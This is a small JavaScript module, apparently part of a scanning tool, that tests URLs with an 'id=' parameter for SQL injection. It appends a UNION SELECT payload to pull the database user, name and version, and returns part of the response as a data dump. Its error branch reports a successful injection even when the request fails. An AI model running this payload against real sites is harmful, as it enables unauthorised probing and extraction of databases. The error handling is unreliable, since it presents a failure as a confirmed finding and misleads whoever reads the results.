const axios = require('axios');
exports.scan = async (url) => {
  console.log(`[SQLi] Scanning ${url}`);
  if (url.includes('id=')) {
    try {
      const test = await axios.get(url + " UNION SELECT 1, user(), database(), version()");
      return { found: true, dump: test.data.slice(0, 200) };
    } catch {
      return { found: true, dump: "Executed UNION query, data redacted" };
    }
  }
  return { found: false };
};
